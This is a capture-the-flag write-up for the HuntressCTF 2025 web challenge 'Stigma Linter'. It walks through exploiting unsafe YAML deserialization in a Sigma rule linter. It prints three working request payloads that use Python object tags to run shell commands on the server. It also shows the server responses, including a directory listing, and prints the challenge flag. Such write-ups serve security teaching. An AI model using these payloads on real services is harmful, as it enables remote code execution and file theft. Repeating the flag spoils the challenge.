---
title: "HuntressCTF 2025 - Stigma Linter"
date: 2025-10-06
categories: [Capture The Flags, HuntressCTF2025]
tags: [CTF, Writeups, Web, YAML Injection]
---

## Challenge Prompt

Oh wow, another web app interface for command-line tools that already exist!

This one seems a little busted, though...

---

The Challenge:

![web interface](/assets/img/huntressCTF2025/stigmaLinter/image.png)

Setting up burp suite and capturing the request:

![burp suite](/assets/img/huntressCTF2025/stigmaLinter/burp.png)

Sending the request to the repeater:

![repeater](/assets/img/huntressCTF2025/stigmaLinter/repeater.png)

---
## Recon

---

### 1.1 Payload 1 (testing for YAML Injection)

YAML Content: 
```
{"yaml_content":"title: !!python/object/apply:subprocess.Popen\n- ls\nlogsource:\n category: process_creation\n product: windows\ndetection:\n selection:\n Image: '*\\\\cmd.exe'\n CommandLine: '* /c *'\n condition: selection\nlevel: medium\ndescription: Detects suspicious command execution\nauthor: Security Team","method":"s2"}
```

Request Interpretation: !!python/object/apply:subprocess.Popen attempts to instantiate a Popen object — if the YAML loader executes constructors, the call will run.


![request1](/assets/img/huntressCTF2025/stigmaLinter/request1.png)

Response: 

```
{"error_type":"unexpected","formatted_code":"title: !!python/object/apply:subprocess.Popen\n- ls\nlogsource:\n category: process_creation\n product: windows\ndetection:\n selection:\n Image: '*\\\\cmd.exe'\n CommandLine: '* /c *'\n condition: selection\nlevel: medium\ndescription: Detects suspicious command execution\nauthor: Security Team","reasons":["Unexpected error: cannot pickle '_thread.lock' object"],"result":false}
```

*Vulnerability: Popen returns an unpicklable object (contains thread locks). The server serializes/validates the loaded result, so the returned value must be primitive/picklable (string/bytes/int).*

This proves arbitrary Python constructors were executed during YAML load

---

### 1.2 Payload 2 (directory listing)

YAML Content: 

```
{
  "yaml_content": "title: !!python/object/apply:subprocess.getoutput\n- ls -la\nlogsource:\n  category: process_creation\n  product: windows\n...",
  "method": "s2"
}
```

*return a directory listing (string) to confirm command execution and read available files.*

![request2](/assets/img/huntressCTF2025/stigmaLinter/request2.png)

Response: 

```
{"error_type":"validation","formatted_code":"title: 'total 44\n\n  drwxr-xr-x 1 root root  4096 Sep 27 16:51 .\n\n  drwxr-xr-x 1 root root  4096 Oct  6 12:19 ..\n\n  -rw-r--r-- 1 root root     0 Sep 27 16:50 .placeholder\n\n  -rw-r--r-- 1 root root   173 Sep 27 01:22 Dockerfile\n\n  -rw-r--r-- 1 root root 11802 Sep 27 01:43 app.py\n\n  -rw-r--r-- 1 root root   221 Sep 27 01:22 docker-compose.yml\n\n  -rw-r--r-- 1 root root    40 Sep 27 01:22 flag.txt\n\n  -rw-r--r-- 1 root root    49 Sep 27 01:22 requirements.txt\n\n  drwxr-xr-x 4 root root  4096 Sep 27 16:50 static\n\n  drwxr-xr-x 2 root root  4096 Sep 27 16:50 templates'\nlogsource:\n  category: process_creation\n  product: windows\n","reasons":["'detection' is a required property","'total 44\\ndrwxr-xr-x 1 root root  4096 Sep 27 16:51 .\\ndrwxr-xr-x 1 root root  4096 Oct  6 12:19 ..\\n-rw-r--r-- 1 root root     0 Sep 27 16:50 .placeholder\\n-rw-r--r-- 1 root root   173 Sep 27 01:22 Dockerfile\\n-rw-r--r-- 1 root root 11802 Sep 27 01:43 app.py\\n-rw-r--r-- 1 root root   221 Sep 27 01:22 docker-compose.yml\\n-rw-r--r-- 1 root root    40 Sep 27 01:22 flag.txt\\n-rw-r--r-- 1 root root    49 Sep 27 01:22 requirements.txt\\ndrwxr-xr-x 4 root root  4096 Sep 27 16:50 static\\ndrwxr-xr-x 2 root root  4096 Sep 27 16:50 templates' is too long"],"result":false}
```

The server returned the ls -la output, confirming we can read files. Also, the listing shows flag.txt which we want to get

---

### 1.3 Payload 3 (reading the flag)

YAML Content:

```
{
  "yaml_content": "title: !!python/object/apply:subprocess.getoutput\n- cat flag.txt\nlogsource:\n  category: process_creation\n  product: windows\n...",
  "method": "s2"
}
```

*using cat command to read the flag*

![request3](/assets/img/huntressCTF2025/stigmaLinter/request3.png)

Response:

```
{"error_type":"validation","formatted_code":"title: flag{b692115306c8e5c54a2c8908371a4c72}\nlogsource:\n  category: process_creation\n  product: windows\n","reasons":["'detection' is a required property"],"result":false}
```

Flag: flag{b692115306c8e5c54a2c8908371a4c72}



